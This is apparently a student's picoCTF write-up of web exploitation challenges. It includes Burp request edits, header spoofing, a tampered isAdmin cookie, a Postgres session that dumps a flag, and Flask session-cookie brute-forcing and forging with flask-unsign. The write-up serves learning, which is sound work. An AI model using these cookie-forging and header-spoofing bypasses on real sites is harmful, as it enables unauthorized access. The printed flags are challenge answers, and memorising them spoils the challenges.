**WEB EXPLOITATION**

PICOCTF

1\.Inspect Element

- Found the flag in the body tab of website when I inspected it.
- Anyways they should have kept the flag hidden in head tab then it would have related to Histiaeus as he hid messages on the head

2\.Intro To Burp

- Did a lightweight scan on website using burp(have professional version somehow)
- Didn’t find anything except one session cookie
- So registered while intercept was on 
- Forwarded it and did the same for otp form also
- Deleted otp= from request and got the flag

3\.Dont-use-client-side

- A verify function was given where flag was split in pieces of four
- Simple reconstruction- picoCTF{no\_clients\_plz\_b706c5}

4\.Where are The robots

- Obviously the creator would not want us to look at robots.txt
- Found / Disallow: /1bb4c.html
- Found the flag there

5\.SQL direct

- After downloading psql and connecting it, I had to google some basic commands
```bash
    (base) mehul@Mehuls-MacBook-Air ~ % psql -h saturn.picoctf.net -p 54826 -U postgres
Password for user postgres: 
psql (14.13 (Homebrew), server 15.2 (Debian 15.2-1.pgdg110+1))
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
Type "help" for help.

postgres=# \l
                                 List of databases
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------+----------+----------+------------+------------+-----------------------
 pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
(4 rows)
postgres=# \c pico
psql (14.13 (Homebrew), server 15.2 (Debian 15.2-1.pgdg110+1))
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
You are now connected to database "pico" as user "postgres".
pico=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

pico=# \d flags
                        Table "public.flags"
  Column   |          Type          | Collation | Nullable | Default 
-----------+------------------------+-----------+----------+---------
 id        | integer                |           | not null | 
 firstname | character varying(255) |           |          | 
 lastname  | character varying(255) |           |          | 
 address   | character varying(255) |           |          | 
Indexes:
    "flags_pkey" PRIMARY KEY, btree (id)

pico=# SELECT * FROM FLAGS
pico-# ;
 id | firstname | lastname  |                address                 
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_31fd14c0}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)

pico=# 
```
6\.Some assembly Required-1
- found that it was interacting with /G82XCw5CX3.js 
- when i opened the js i found /JIFxzHyW8W some obsure wasm probably
- using some wasm decompilers(it didnt even require that) i found the flag

7\.Who are you?
- Honestly the best challenge i have come across till now
- had to use some help but learnt a lot
- this is the orignal get request:
```bash
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- first had to change the useragent to PicoBrowser as it said only PicoBrowser is allowed
- Then i said it didnt trust users from other sites so had to cahnge the referer to the host only which is Referer: mercury.picoctf.net:52362
- Then it said site worked only in 2018 so i added Date: Wed, 21 Oct 2018 07:28:00 GMT
- Then had to make the request untarckable by DNT:1
- then it said the site worked only in sweden so i set the ip address for seden in X-Forwarded-For: 92.44.242.19
- finally  i also had to change the language to get the flag
- this is the final get request:
```bash
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: sv-sv,sv;q=0.9
Date: Wed, 21 Oct 2018 07:28:00 GMT
DNT:1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: mercury.picoctf.net:52362
X-Forwarded-For: 92.44.242.19
Connection: keep-alive
```
8\.Power cookies
- Opened Burp Suite as usual while intercept was on
- when i clicked on continue as guest this was the get request 
``` bash 
GET /check.php HTTP/1.1
Host: saturn.picoctf.net:61613
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://saturn.picoctf.net:61613/
Accept-Encoding: gzip, deflate, br
Cookie: isAdmin=0
Connection: keep-alive
``` 
- i just changed cookie to 1 to get the flag

9\. Most Cookies
- downlaoded flask-unsign
- looked how server.py worked
- put all the cookies in cookies.txt using echo
```bash 
white chocolate macadamia" > cookies.txt
(base) mehul@Mehuls-MacBook-Air ~ % flask-unsign -u --server "http://mercury.picoctf.net:6259" --wordlist cookies.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZzHbYg.w4jlmorAeZI4g8H9OBKzEPLdNQg
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
(base) mehul@Mehuls-MacBook-Air ~ % flask-unsign -s --c "{'very_auth': 'admin'}" -S gingersnap
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET] [--salt SALT]
                    [--wordlist WORDLIST] [--threads THREADS] [--no-literal-eval] [--server SERVER]
                    [--insecure] [-o OUTPUT] [-p PROXY] [--cookie-name COOKIE_NAME] [-U USER_AGENT]
                    [-q] [-C CHUNK_SIZE] [-v]
flask-unsign: error: ambiguous option: --c could match --cookie, --cookie-name, --chunk-size
(base) mehul@Mehuls-MacBook-Air ~ % flask-unsign -s --cookie "{'very_auth': 'admin'}" -S gingersnap
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZzHcaA.TJeYJKO5shWe2Nyrkz8cbYSFQlE
(base) mehul@Mehuls-MacBook-Air ~ % 
```
- put this value as session value and got the flag

10\. More sqli
